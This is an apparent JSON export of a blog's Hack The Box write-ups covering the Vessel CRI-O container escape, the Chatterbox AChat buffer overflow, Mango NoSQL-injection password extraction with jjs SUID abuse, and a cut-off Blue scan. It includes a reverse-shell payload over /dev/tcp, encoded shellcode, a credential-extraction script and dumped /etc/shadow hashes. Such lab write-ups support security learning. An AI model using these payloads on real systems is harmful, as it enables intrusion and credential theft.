article:\n\n“Dubbed “cr8escape,” when invoked, an attacker could escape from a Kubernetes container and gain root access to the host and be able to move anywhere in the cluster.”\n“.. discovered a flaw introduced in CRI-O version 1.19 that allows an attacker to bypass these safeguards and set arbitrary kernel parameters on the host.”\n“.. anyone with rights to deploy a pod on a Kubernetes cluster that uses the CRI-O runtime can abuse the “kernel.core_pattern” parameter to achieve container escape and arbitrary code execution as root on any node in the cluster.”\nA PoC on how to exploit this vulnerability with kubectl\n\nethan@vessel:/$ crio --version\ncrio version 1.19.6\nVersion:       1.19.6\nGitCommit:     c12bb210e9888cf6160134c7e636ee952c45c05a\nGitTreeState:  clean\nBuildDate:     2022-03-15T18:18:24Z\nGoVersion:     go1.15.2\nCompiler:      gc\nPlatform:      linux/amd64\nLinkmode:      dynamic\nWe’ve most definitely found the start towards root.\n\n\nStep 2\nReading about the exploit we should (1) create a pod/container, (2) use pinns to exploit the vulnerable variable kernel.core_pattern, (3) trigger a core dump and then reap the rewards\nThis is all easy in theory, but we don’t have kubectl, minikube or docker available. However we do have runc! (1) Follow the steps on HackTricks to create a container.\n## Create location for runc filesystem\nethan@vessel:/$ mkdir /tmp/pthree\nethan@vessel:/$ mkdir /tmp/pthree/rootfs\n\n## Create runc configuration\nethan@vessel:/tmp/pthree$ runc spec\n\n## Add following data under 'mounts' section of config.json\n{\n\"type\": \"bind\",\n\"source\": \"/\",\n\"destination\": \"/\",\n\"options\": [\n\"rbind\",\n\"rw\",\n\"rprivate\"\n]\n},\n\n## Start runc\nethan@vessel:/tmp/pthree$ runc run privesc\nERRO[0000] runc run failed: rootless container requires user namespaces\nReading about this I find a GitHub Issue stating that generating the default spec using run spec --rootless will solve the problem, so remove everything and try again.\nethan@vessel:/tmp/pthree$ rm -rf *\nethan@vessel:/tmp/pthree$ runc spec --rootless\nethan@vessel:/tmp/pthree$ mkdir rootfs\nethan@vessel:/tmp/pthree$ vim config.json \nethan@vessel:/tmp/pthree$ runc run privesc\n# hostname\nrunc\nGreat, we got a container! (2) Open a second terminal and write a simple PoC script to be executed\nethan@vessel:/tmp$ cat poc \n#!/bin/sh\nwhoami &gt;&gt; /tmp/out\nhostname &gt;&gt; /tmp/out\nFrom the second terminal run the malicious pinns command, I found this great Chinese post showcasing this.\nethan@vessel:/tmp$ /usr/bin/pinns -d /tmp/pthree -f privesc -s 'kernel.shm_rmid_forced=1+kernel.core_pattern=|/tmp/poc #'--ipc --net --uts\nWe can verify that netns and utsns are created in /tmp/pthree from the container:\n# ls -al /tmp/pthree\ntotal 24\ndrwxrwxr-x  5 root   root    4096 Sep  2 09:07 .\ndrwxrwxrwt 17 nobody nogroup 4096 Sep  2 09:03 ..\n-rw-rw-r--  1 root   root    2893 Sep  2 08:59 config.json\ndrwxr-xr-x  2 nobody root    4096 Sep  2 09:07 netns\ndrwxrwxr-x  2 root   root    4096 Sep  2 08:58 rootfs\ndrwxr-xr-x  2 nobody root    4096 Sep  2 09:07 utsns\n(3) In the first terminal (runc container) trigger a core dump to run the script.\nroot@runc:/# ulimit -c unlimited\nroot@runc:/# tail -f /dev/null &\n[1] 32\nroot@runc:/# kill -SIGSEGV 32\nroot@runc:/# ps\n    PID TTY          TIME CMD\n      1 pts/0    00:00:00 sh\n     18 pts/0    00:00:00 bash\n     33 pts/0    00:00:00 ps\n[1]+  Segmentation fault      (core dumped) tail -f /dev/null\nReap the rewards from the script:\nethan@vessel:/tmp/pthree$ cat /tmp/out \nroot\nvessel\n\n\nStep 3\nThe PoC works as intended, weaponize to gain a root shell however you like. Myself, I’d like to try the payload posted in the Chinese post.\nethan@vessel:/tmp/pthree$ /usr/bin/pinns -d /tmp/pthree -f privesc1337 -s 'kernel.shm_rmid_forced=1+kernel.core_pattern=|/bin/bash -c \"$@\" -- eval /bin/bash -i &gt;& /dev/tcp/10.10.14.16/4488 0&gt;&1 #'--ipc --net --uts\n\nroot@runc:/# ulimit -c unlimited\nroot@runc:/# tail -f /dev/null &\n[1] 34\nroot@runc:/# kill -SIGSEGV 34\n\n➜  vessel nc -lvnp 4488\nlistening on [any] 4488 ...\nconnect to [10.10.14.16] from (UNKNOWN) [10.10.11.178] 49816\nroot@vessel:/# id && hostname\nuid=0(root) gid=0(root) groups=0(root)\nvessel\n\nroot@vessel:/# cat /root/root.txt\n86dad527504c8042c21914394acb7115\n\nroot@vessel:/# cat /etc/shadow\nroot:$6$9AU197eAAajcv6DO$YOGX5f111bLxtIqVgPKGg3QmWiWIRVmYk3Gkj0BwFVb9K0BkAnJEHaRJElahiQGxtDnvjPI9XqPMkI7YrE60A1:19101:0:99999:7:::\nethan:$6$7ZmNCkavGVnqDtRI$DXwHR.p1AXlIwDsoi20wpd57ZQL4doguuNxh4XY.vzX8wwnD8uz5Gz2AG6tWDEDfsO8CQFOYgEHg/riNHOJ4k0:19099:0:99999:7:::\nsteven:$6$Czg9.c1hcgYo7ON4$ogez7L7bCGFTURA4LcPv8A5CWdGufpkI4QHhSfKtZUMq2vzT7hKP/.DSDRXSQBWzgvVTnIpY/jG.zYFIgWFXD.:19099:0:99999:7:::"
  },
  {
    "objectID": "posts/2021-03-27-htb-writeup-chatterbox/2021-03-27-htb-writeup-chatterbox.html",
    "href": "posts/2021-03-27-htb-writeup-chatterbox/2021-03-27-htb-writeup-chatterbox.html",
    "title": "chatterbox - Hack The Box",
    "section": "",
    "text": "██╗   ██╗███████╗███████╗██████╗\n   ██║   ██║██╔════╝██╔════╝██╔══██╗\n   ██║   ██║███████╗█████╗  ██████╔╝\n   ██║   ██║╚════██║██╔══╝  ██╔══██╗\n   ╚██████╔╝███████║███████╗██║  ██║\n    ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝\n\n1. [root:/git/htb/chatterbox]# nmap -Pn -n -sCV 10.10.10.74 --open                                                                   (master✱)\nHost discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-03-26 10:20 CET\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 201.69 seconds\n\nNormal nmap scan finds nothing. Trying UDP returns the same, nothing.\n[root:/git/htb/chatterbox]# nmap -sU -sV --version-intensity 0 -F -n 10.10.10.74                                                  (master✱)\n  Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-26 10:24 CET\n  Nmap scan report for 10.10.10.74\n  Host is up (0.035s latency).\n  All 100 scanned ports on 10.10.10.74 are open|filtered\n\nExpand the tcp scan by looking on all ports.\n[root:/git/htb/chatterbox]# nmap -p- -T5 10.10.10.74                                                                              (master✱)\n  Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-26 10:33 CET\n  Nmap scan report for chatterbox.htb (10.10.10.74)\n  Host is up (0.034s latency).\n  Not shown: 65533 filtered ports\n  PORT     STATE SERVICE\n  9255/tcp open  mon\n  9256/tcp open  unknown\n\nVersion and script scan to see if we can figure out anything more about the services:\n[root:/git/htb/chatterbox]# nmap -sCV -p9255,9256 10.10.10.74                                                                     (master✱)\n  Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-26 10:38 CET\n  Nmap scan report for chatterbox.htb (10.10.10.74)\n  Host is up (0.034s latency).\n\n  PORT     STATE SERVICE VERSION\n  9255/tcp open  http    AChat chat system httpd\n  |_http-server-header: AChat\n  |_http-title: Site doesn't have a title.\n  9256/tcp open  achat   AChat chat system\n\n[root:/git/htb/chatterbox]# curl 10.10.10.74:9255                                                                                 (master✱)\n[root:/git/htb/chatterbox]# curl 10.10.10.74:9256                                                                                 (master✱)\n  curl: (1) Received HTTP/0.9 when not allowed\n\n\n2. Google for 'AChat enumerate port 9255 9256' and I come across 'achat reverse tcp exploit'. Downloading the files,\nmodify the payload-file to create a 'windows/shell_reverse_tcp' payload rather then meterpreter (no go in OSCP).\n\nGenerate the payload, edit the exploit-file with the new buf-data, and lastly change the server address (in the script)\nto our victim.\n\n[root:/git/htb/chatterbox]# ./AChat_Payload.sh                                                                                    (master✱)\n  RHOST: 10.10.10.74\n  LHOST: 10.10.14.5\n  LPORT: 4488\n  Found 1 compatible encoders\n  Attempting to encode payload with 1 iterations of x86/unicode_mixed\n  x86/unicode_mixed succeeded with size 774 (iteration=0)\n  x86/unicode_mixed chosen with final size 774\n  Payload size: 774 bytes\n  Final size of python file: 3767 bytes\n  buf =  b\"\"\n  buf += b\"\\x50\\x50\\x59\\x41\\x49\\x41\\x49\\x41\\x49\\x41\\x49\\x41\\x49\"\n  buf += b\"\\x41\\x49\\x41\\x49\\x41\\x49\\x41\\x49\\x41\\x49\\x41\\x49\\x41\"\n  buf += b\"\\x49\\x41\\x49\\x41\\x49\\x41\\x6a\\x58\\x41\\x51\\x41\\x44\\x41\"\n  buf += b\"\\x5a\\x41\\x42\\x41\\x52\\x41\\x4c\\x41\\x59\\x41\\x49\\x41\\x51\"\n  buf += b\"\\x41\\x49\\x41\\x51\\x41\\x49\\x41\\x68\\x41\\x41\\x41\\x5a\\x31\"\n  buf += b\"\\x41\\x49\\x41\\x49\\x41\\x4a\\x31\\x31\\x41\\x49\\x41\\x49\\x41\"\n  buf += b\"\\x42\\x41\\x42\\x41\\x42\\x51\\x49\\x31\\x41\\x49\\x51\\x49\\x41\"\n  buf += b\"\\x49\\x51\\x49\\x31\\x31\\x31\\x41\\x49\\x41\\x4a\\x51\\x59\\x41\"\n  buf += b\"\\x5a\\x42\\x41\\x42\\x41\\x42\\x41\\x42\\x41\\x42\\x6b\\x4d\\x41\"\n  buf += b\"\\x47\\x42\\x39\\x75\\x34\\x4a\\x42\\x49\\x6c\\x48\\x68\\x35\\x32\"\n  buf += b\"\\x39\\x70\\x4b\\x50\\x6b\\x50\\x53\\x30\\x31\\x79\\x6b\\x35\\x50\"\n  buf += b\"\\x31\\x55\\x70\\x4f\\x74\\x62\\x6b\\x42\\x30\\x6e\\x50\\x42\\x6b\"\n  buf += b\"\\x6e\\x72\\x6a\\x6c\\x44\\x4b\\x6e\\x72\\x4e\\x34\\x34\\x4b\\x52\"\n  buf += b\"\\x52\\x4d\\x58\\x7a\\x6f\\x74\\x77\\x4f\\x5a\\x4d\\x56\\x6d\\x61\"\n  buf += b\"\\x59\\x6f\\x74\\x6c\\x6f\\x4c\\x70\\x61\\x43\\x4c\\x6c\\x42\\x4c\"\n  buf += b\"\\x6c\\x6f\\x30\\x35\\x71\\x78\\x4f\\x7a\\x6d\\x4d\\x31\\x56\\x67\"\n  buf += b\"\\x57\\x72\\x4c\\x32\\x52\\x32\\x51\\x47\\x62\\x6b\\x62\\x32\\x4a\"\n  buf += b\"\\x70\\x62\\x6b\\x4e\\x6a\\x4d\\x6c\\x44\\x4b\\x30\\x4c\\x4e\\x31\"\n  buf += b\"\\x42\\x58\\x38\\x63\\x6d\\x78\\x59\\x71\\x47\\x61\\x70\\x51\\x44\"\n  buf += b\"\\x4b\\x52\\x39\\x4f\\x30\\x6d\\x31\\x78\\x53\\x64\\x4b\\x51\\x39\"\n  buf += b\"\\x7a\\x78\\x69\\x53\\x6e\\x5a\\x6d\\x79\\x62\\x6b\\x4d\\x64\\x64\"\n  buf += b\"\\x4b\\x6d\\x31\\x49\\x46\\x50\\x31\\x59\\x6f\\x54\\x6c\\x76\\x61\"\n  buf += b\"\\x36\\x6f\\x6c\\x4d\\x59\\x71\\x49\\x37\\x6e\\x58\\x39\\x50\\x43\"\n  buf += b\"\\x45\\x4c\\x36\\x6c\\x43\\x33\\x4d\\x6c\\x38\\x6f\\x4b\\x73\\x4d\"\n  buf += b\"\\x6b\\x74\\x64\\x35\\x6b\\x34\\x72\\x38\\x44\\x4b\\x52\\x38\\x4d\"\n  buf += b\"\\x54\\x7a\\x61\\x38\\x53\\x50\\x66\\x72\\x6b\\x4c\\x4c\\x70\\x4b\"\n  buf += b\"\\x34\\x4b\\x61\\x48\\x4b\\x6c\\x39\\x71\\x68\\x53\\x54\\x4b\\x6d\"\n  buf += b\"\\x34\\x32\\x6b\\x79\\x71\\x78\\x50\\x61\\x79\\x4f\\x54\\x6f\\x34\"\n  buf += b\"\\x6d\\x54\\x61\\x4b\\x6f\\x6b\\x63\\x31\\x42\\x39\\x50\\x5a\\x52\"\n  buf += b\"\\x31\\x49\\x6f\\x69\\x50\\x4f\\x6f\\x31\\x4f\\x51\\x4a\\x64\\x4b\"\n  buf += b\"\\x6a\\x72\\x6a\\x4b\\x32\\x6d\\x6f\\x6d\\x72\\x48\\x6c\\x73\\x6d\"\n  buf += b\"\\x62\\x4b\\x50\\x6d\\x30\\x73\\x38\\x53\\x47\\x70\\x73\\x70\\x32\"\n  buf += b\"\\x31\\x4f\\x50\\x54\\x72\\x48\\x6e\\x6c\\x50\\x77\\x6e\\x46\\x69\"\n  buf += b\"\\x77\\x4b\\x4f\\x67\\x65\\x57\\x48\\x64\\x50\\x6a\\x61\\x69\\x70\"\n  buf += b\"\\x59\\x70\\x6b\\x79\\x66\\x64\\x4f\\x64\\x6e\\x70\\x52\\x48\\x4d\"\n  buf += b\"\\x59\\x75\\x30\\x62\\x4b\\x69\\x70\\x59\\x6f\\x36\\x75\\x42\\x30\"\n  buf += b\"\\x32\\x30\\x72\\x30\\x6e\\x70\\x6d\\x70\\x4e\\x70\\x4d\\x70\\x30\"\n  buf += b\"\\x50\\x52\\x48\\x7a\\x4a\\x4a\\x6f\\x57\\x6f\\x67\\x70\\x59\\x6f\"\n  buf += b\"\\x47\\x65\\x43\\x67\\x70\\x6a\\x4a\\x65\\x71\\x58\\x4a\\x6a\\x69\"\n  buf += b\"\\x7a\\x6a\\x6e\\x59\\x75\\x32\\x48\\x6b\\x52\\x6b\\x50\\x6b\\x61\"\n  buf += b\"\\x33\\x58\\x34\\x49\\x78\\x66\\x70\\x6a\\x6e\\x30\\x42\\x36\\x51\"\n  buf += b\"\\x47\\x6f\\x78\\x35\\x49\\x54\\x65\\x30\\x74\\x63\\x31\\x79\\x6f\"\n  buf += b\"\\x36\\x75\\x62\\x65\\x69\\x30\\x73\\x44\\x7a\\x6c\\x79\\x6f\\x70\"\n  buf += b\"\\x4e\\x6a\\x68\\x44\\x35\\x5a\\x4c\\x30\\x68\\x38\\x70\\x57\\x45\"\n  buf += b\"\\x34\\x62\\x71\\x46\\x4b\\x4f\\x48\\x55\\x61\\x58\\x33\\x33\\x52\"\n  buf += b\"\\x4d\\x4f\\x74\\x6b\\x50\\x32\\x69\\x69\\x53\\x71\\x47\\x50\\x57\"\n  buf += b\"\\x71\\x47\\x6c\\x71\\x79\\x66\\x4f\\x7a\\x4b\\x62\\x32\\x39\\x31\"\n  buf += b\"\\x46\\x47\\x72\\x4b\\x4d\\x62\\x46\\x48\\x47\\x4d\\x74\\x4d\\x54\"\n  buf += b\"\\x6f\\x4c\\x69\\x71\\x6b\\x51\\x72\\x6d\\x4e\\x64\\x6c\\x64\\x6c\"\n  buf += b\"\\x50\\x67\\x56\\x49\\x70\\x6d\\x74\\x42\\x34\\x4e\\x70\\x6f\\x66\"\n  buf += b\"\\x71\\x46\\x4f\\x66\\x61\\x36\\x52\\x36\\x6e\\x6e\\x62\\x36\\x62\"\n  buf += b\"\\x36\\x6e\\x73\\x4e\\x76\\x53\\x38\\x30\\x79\\x58\\x4c\\x6d\\x6f\"\n  buf += b\"\\x74\\x46\\x4b\\x4f\\x68\\x55\\x62\\x69\\x37\\x70\\x6e\\x6e\\x62\"\n  buf += b\"\\x36\\x6f\\x56\\x4b\\x4f\\x4c\\x70\\x61\\x58\\x4d\\x38\\x54\\x47\"\n  buf += b\"\\x6b\\x6d\\x33\\x30\\x6b\\x4f\\x66\\x75\\x67\\x4b\\x49\\x50\\x4d\"\n  buf += b\"\\x4d\\x4d\\x5a\\x59\\x7a\\x61\\x58\\x76\\x46\\x34\\x55\\x77\\x4d\"\n  buf += b\"\\x53\\x6d\\x39\\x6f\\x36\\x75\\x6f\\x4c\\x5a\\x66\\x51\\x6c\\x5a\"\n  buf += b\"\\x6a\\x71\\x70\\x6b\\x4b\\x79\\x50\\x54\\x35\\x5a\\x65\\x55\\x6b\"\n  buf += b\"\\x31\\x37\\x6b\\x63\\x31\\x62\\x72\\x4f\\x71\\x5a\\x79\\x70\\x51\"\n\n[root:/git/htb/chatterbox]# python AChat_Exploit.py                                                                               (master✱)\n  [+] BUFFER OVERFLOW PAYLOAD RELEASED -- CHECK YOUR HANDLER\n\n[root:/git/htb/chatterbox]# rlwrap nc -lvnp 4488                                                                                  (master✱)\n  listening on [any] 4488 ...\n  connect to [10.10.14.5] from (UNKNOWN) [10.10.10.74] 49161\n  Microsoft Windows [Version 6.1.7601]\n  Copyright (c) 2009 Microsoft Corporation.  All rights reserved.\n\n  C:\\Windows\\system32&gt; whoami\n    chatterbox\\alfred\n\n\n3. Grab user.txt\n\nC:\\Users\\Alfred\\Desktop&gt; type user.txt\n  02c94ad2f3a9d10f7f327b895249a2f8\n\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n\n   ██████╗  ██████╗  ██████╗ ████████╗\n   ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝\n   ██████╔╝██║   ██║██║   ██║   ██║\n   ██╔══██╗██║   ██║██║   ██║   ██║\n   ██║  ██║╚██████╔╝╚██████╔╝   ██║\n   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝\n\n\n1. Once we have a reverse shell as Alfred, we notice that we got read access to the \\Users\\Administrator directory - usually\nthe users don't have permission to enter this folder.\n\nC:\\Users\\Administrator\\Desktop&gt; type root.txt\nAccess is denied.\n\nUnfortunately we can't just print root as of yet. But maybe the privileges of the Admin dir is a good place to start.\n\nC:\\Users\\Administrator\\Desktop&gt; dir root.txt /q\n  03/26/2021  07:51 AM                34 CHATTERBOX\\Alfred      root.txt\n\n\nC:\\Users\\Administrator\\Desktop&gt; cacls root.txt /G Alfred:R\n  Are you sure (Y/N)? y\n  processed file: C:\\Users\\Administrator\\Desktop\\root.txt\n\nC:\\Users\\Administrator\\Desktop&gt; type root.txt\n  efd540d3337ebc9d2682bec22ab89f45\n\n\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n\n   ██╗███╗   ██╗███████╗ ██████╗ ██████╗ ███╗   ███╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗\n   ██║████╗  ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║\n   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██╔████╔██║███████║   ██║   ██║██║   ██║██╔██╗ ██║\n   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║╚██╔╝██║██╔══██║   ██║   ██║██║   ██║██║╚██╗██║\n   ██║██║ ╚████║██║     ╚██████╔╝██║  ██║██║ ╚═╝ ██║██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║\n   ╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝\n\nAChat Reverse TCP Exploit:\n  https://github.com/EDB4YLI55/achat_reverse_tcp_exploit\n\nFile ownership Win7:\n  https://superuser.com/questions/691578/how-to-display-change-the-owner-of-a-file-on-windows-7"
  },
  {
    "objectID": "posts/2019-11-14-htb-writeup-mango/2019-11-14-htb-writeup-mango.html",
    "href": "posts/2019-11-14-htb-writeup-mango/2019-11-14-htb-writeup-mango.html",
    "title": "Mango - Hack The Box",
    "section": "",
    "text": "“Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry’s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.”\n\n██╗ ██╗███████╗███████╗██████╗ ██║ ██║██╔════╝██╔════╝██╔══██╗ ██║ ██║███████╗█████╗ ██████╔╝ ██║ ██║╚════██║██╔══╝ ██╔══██╗ ╚██████╔╝███████║███████╗██║ ██║ ╚═════╝ ╚══════╝╚══════╝╚═╝ ╚═╝\n\nnmap -Pn -sC -sV -n mango.htb PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 a8:8f:d9:6f:a6:e4:ee:56:e3:ef:54:54:6d:56:0c:f5 (RSA) | 256 6a:1c:ba:89:1e:b0:57:2f:fe:63:e1:61:72:89:b4:cf (ECDSA) |_ 256 90:70:fb:6f:38:ae:dc:3b:0b:31:68:64:b0:4e:7d:c9 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: 403 Forbidden 443/tcp open ssl/ssl Apache httpd (SSL-only mode) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Mango | Search Base | ssl-cert: Subject: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN | Not valid before: 2019-09-27T14:21:19 |_Not valid after: 2020-09-26T14:21:19 |ssl-date: TLS randomness does not represent time | tls-alpn: | http/1.1 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nnmap -Pn -sV -n -p- mango.htb PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) 443/tcp open ssl/ssl Apache httpd (SSL-only mode) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\nnmap -Pn -sV -n -sU mango.htb All 1000 scanned ports on mango.htb (10.10.10.162) are closed\n\nEnum with dirb and nikto, loot: Login Page: http://staging-order.mango.htb (also shown in nmap ssl-script)\nBrowsing https://mango.htb/analytics.php gives you a key and that it’s applicable for *codepen.io, add it to host-file root@p3:~/Downloads# cat /etc/hosts 10.10.10.162 mango.htb staging-order.mango.htb mango.htb.codepen.io\nBrowsing the site https://mango.htb.codepen.io/analytics.php now gives us analytic data over startups in different states.\nConnecting to Elasticsearch and using some random table gives us data from /User/iansadovy/Downloads/Entities.cvs POSSIBLE USERNAME: iansadovy\nTrying NoSQL Injection (via Burp) on the login page reveals that the username is admin. Request with ‘testuser’ returns Response ‘200 OK’, but request with user ‘admin’ returns ‘302 Found’, confirming the user. REQUEST POST / HTTP/1.1 Host: staging-order.mango.htb username=testuser&password[$gt]=&login=login RESPONSE HTTP/1.1 200 OK\nREQUEST POST / HTTP/1.1 Host: staging-order.mango.htb username=admin&password[$gt]=&login=login RESPONSE HTTP/1.1 302 Found\nIn order to get the password we need a script go through every character to see if we get 302 or 200 responses. From the following two sites I found examples of Blind NoSQL Injection using POST. .. https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection#post-with-json-body .. https://blog.0daylabs.com/2016/09/05/mongo-db-password-extraction-mmactf-100/\nI used the script from 0daylabs as my base and modified it to fit my objective, complete script below.\nimport requests import string import re\npw = “” url = “http://staging-order.mango.htb/index.php”\n# Each time a 302 redirect is seen, we should restart the loop restart = True\nwhile restart: restart = False\n  # Characters like *, ., &, and + has to be avoided because we use regex\n  for i in string.ascii_letters + string.digits + \"!#%&'(),/:;&lt;=&gt;@[]^_`{}~-\":\n      payload = pw + i\n      post_data = {'username': 'admin', 'password[$regex]': \"^\" + re.escape(payload) + \".*\", 'login': 'login'}\n      #print(post_data)\n      r = requests.post(url, data=post_data, allow_redirects=False)\n      #print(r)\n\n      # A correct password means we get a 302 redirect\n      if r.status_code == 302:\n          print(payload)\n          restart = True\n          pw = payload\n\n      break\nNOTE: In the end I got stuck with regex and special characters. re.escape() and “^” infront of the payload solved it.\nRun the script to extract the password and login. NOTE: Creds - admin:t9KcS3&gt;!0B#2\nroot@p3:/opt/htb/machines/mango# python pwExtract.py t t9 t9K t9Kc t9KcS t9KcS3 t9KcS3&gt; t9KcS3&gt;! t9KcS3&gt;!0 t9KcS3&gt;!0B t9KcS3&gt;!0B# t9KcS3&gt;!0B#2 root@p3:/opt/htb/machines/mango#\nModify the script to enumerate users. We know of user admin, so using the script will stop on A. Using burp I found another user starting with M. Entered M as the starting letter in the script and run it:\nroot@p3:/opt/htb/machines/mango# python userExtract.py ma man mang mango root@p3:/opt/htb/machines/mango#\nExtract the password for user Mango. root@p3:/opt/htb/machines/mango# python pwExtract.py h h3 h3m h3mX h3mXK h3mXK8 h3mXK8R h3mXK8Rh h3mXK8RhU h3mXK8RhU~ h3mXK8RhU~f h3mXK8RhU~f{ h3mXK8RhU~f{] h3mXK8RhU~f{]f h3mXK8RhU~f{]f5 h3mXK8RhU~f{]f5H root@p3:/opt/htb/machines/mango#\nNOTE: Creds - mango:h3mXK8RhU~f{]f5H\nUsing SSH to login with admin-creds doesn’t work, but with mango-creds it does. Looking in /home/admin we can see user.txt but can’t read it. Change user to admin to get the flag.\nmango@mango:/home/admin$ cat user.txt cat: user.txt: Permission denied mango@mango:/home/admin$ su admin $ cat user.txt 79bf****************************\n\nALL FOUND CREDS: admin:t9KcS3&gt;!0B#2 mango:h3mXK8RhU~f{]f5H iansadovy: MrR3boot: root:\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██████╗ ██████╗ ██████╗ ████████╗ ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝ ██████╔╝██║ ██║██║ ██║ ██║ ██╔══██╗██║ ██║██║ ██║ ██║ ██║ ██║╚██████╔╝╚██████╔╝ ██║ ╚═╝ ╚═╝ ╚═════╝ ╚═════╝ ╚═╝\n\nSSH in as user mango and pivot to admin. Upgrade the shell, python isn’t available so user python3 instead. $ python3 -c ‘import pty;pty.spawn(“/bin/bash”)’ admin@mango:/home/mango$\nRunning lse.sh gives ut two binaries with SUID bit set [!] fst020 Uncommon setuid binaries…………………………………. yes! — /usr/bin/run-mailcap /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs —\nLooking at gftobins jjs has a lot of exploits, the one that worked for me is “File Read”. Trying to use “Sudo” or “Shell” made the shell non-interactive / stuck. Using “Reverse Shell” I wasn’t able to get a callback, so I opted towards the easy “File Read”.\nadmin@mango:/dev/shm$ vi read.sh admin@mango:/dev/shm$ chmod +x read.sh admin@mango:/dev/shm$ ./read.sh Warning: The jjs tool is planned to be removed from a future JDK release jjs&gt; var BufferedReader = Java.type(“java.io.BufferedReader”); jjs&gt; var FileReader = Java.type(“java.io.FileReader”); jjs&gt; var br = new BufferedReader(new FileReader(“/root/root.txt”)); jjs&gt; while ((line = br.readLine()) != null) { print(line); } 8a8e****************************\nNOTE: To get an interactive root-shell you can also use “File Write” and write your public key to /root/.ssh/authorized_keys\n\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██╗███╗ ██╗███████╗ ██████╗ ██████╗ ███╗ ███╗ █████╗ ████████╗██╗ ██████╗ ███╗ ██╗ ██║████╗ ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗ ██║ ██║██╔██╗ ██║█████╗ ██║ ██║██████╔╝██╔████╔██║███████║ ██║ ██║██║ ██║██╔██╗ ██║ ██║██║╚██╗██║██╔══╝ ██║ ██║██╔══██╗██║╚██╔╝██║██╔══██║ ██║ ██║██║ ██║██║╚██╗██║ ██║██║ ╚████║██║ ╚██████╔╝██║ ██║██║ ╚═╝ ██║██║ ██║ ██║ ██║╚██████╔╝██║ ╚████║ ╚═╝╚═╝ ╚═══╝╚═╝ ╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚═╝ ╚═╝ ╚═╝ ╚═╝ ╚═════╝ ╚═╝ ╚═══╝\nMongoDB NoSQLi: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection#post-with-json-body https://blog.0daylabs.com/2016/09/05/mongo-db-password-extraction-mmactf-100/\nGTFOBINS: https://gtfobins.github.io/gtfobins/jjs/"
  },
  {
    "objectID": "posts/2019-04-09-htb-writeup-blue/2019-04-09-htb-writeup-blue.html",
    "href": "posts/2019-04-09-htb-writeup-blue/2019-04-09-htb-writeup-blue.html",
    "title": "Blue - Hack The Box",
    "section": "",
    "text": "[root:/git/htb/blue]# nmap -Pn -n -sCV 10.10.10.40 --open                                                                         (master✱)\n  Not shown: 991 closed ports\n  PORT      STATE SERVICE      VERSION\n  135/tcp   open  msrpc        Microsoft Windows RPC\n  139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn\n  445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)\n  49152/tcp open  msrpc        Microsoft Windows RPC\n  49153/tcp open  msrpc        Microsoft Windows RPC\n  49154/tcp open  msrpc        Microsoft Windows RPC\n  49155/tcp open  msrpc        Microsoft Windows RPC\n  49156/tcp open  msrpc        Microsoft Windows RPC\n  49157/tcp open  msrpc        Microsoft Windows RPC\n  Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows\n\n  Host script results:\n  |_clock-skew: mean: 3m40s, deviation: 1s, median: 3m39s\n  | smb-os-discovery:\n  |   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)\n  |   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional\n  |   Computer name: haris-PC\n  |   NetBIOS computer name: HARIS-PC\\x00\n  |   Workgroup: WORKGROUP\\x00\n  |_  System time: 2021-02-24T13:00:40+00:00\n  | smb-security-mode:\n  |   account_used: guest\n  |   authentication_level: user\n  |   challenge_response: supported\n  |_ 